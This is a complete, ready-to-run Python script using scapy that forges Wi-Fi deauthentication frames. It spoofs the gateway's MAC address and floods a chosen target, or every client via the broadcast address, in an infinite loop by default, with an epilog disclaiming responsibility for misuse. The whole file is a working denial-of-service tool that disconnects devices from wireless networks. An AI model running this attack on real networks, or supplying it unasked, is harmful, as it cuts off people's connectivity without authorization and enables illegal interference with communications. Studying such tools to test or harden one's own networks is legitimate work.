#!/usr/bin/env python

import argparse
import signal
from sys import exit

from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, sendp


def keyboard_interrupt_handler(interrupt_signal, frame):
    """
    Keyboard (CTRL + C) interrupt function
    """
    print("Stop sending deauthentication frames")
    print("KeyboardInterrupt ID: {} {} has been caught.".format(interrupt_signal, frame))
    exit(0)


def send_deauthentication_frames(target_mac, gateway_mac, interval, number, loop):
    """
    Send deauthentication frames

    :param target_mac: destination MAC address
    :type target_mac: str
    :param gateway_mac: source or AP MAC address
    :type gateway_mac: str
    :param interval: frequency between two frames
    :type interval: float
    :param number: number of deauthentication frames
    :type number: int
    :param loop: enable/disable infinite loop
    :type loop: int
    """
    global interface

    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=interval, count=number, loop=loop, iface=interface, verbose=1)


def run_app():
    """
    Main function to parse arguments and run
    """
    global interface

    description = 'Wifi deauthentication (also possible ff:ff:ff:ff:ff:ff for target or 0 for number)'
    epilog = 'The author of this code take no responsibility for your use or misuse'
    parser = argparse.ArgumentParser(prog='WifiDeauth.py', description=description, epilog=epilog)
    parser.add_argument('interface', help="Your interface in monitor mode")
    parser.add_argument('target', help="Target MAC address to deauthenticate")
    parser.add_argument('gateway', help="Gateway MAC address that target is authenticated with")
    parser.add_argument('-n', '--number', help='Number of deauthentication frames to send', default=0, type=int)
    parser.add_argument('-i', '--interval', help="Time between frames, default is 0.1s (100ms)", default=0.1)
    args = parser.parse_args()

    interface = args.interface
    target = args.target
    gateway = args.gateway
    interval = float(args.interval)
    number = int(args.number)

    if number == 0:
        number = None
        loop = 1
    else:
        loop = 0

    if number:
        print("Sending {} frames every {}s to {} from {}".format(number, interval, target, gateway))
    else:
        print("Sending infinite frames every {}s to {} from {}".format(interval, target, gateway))

    send_deauthentication_frames(target, gateway, interval, number, loop)


if __name__ == "__main__":
    interface = None
    signal.signal(signal.SIGINT, keyboard_interrupt_handler)
    run_app()
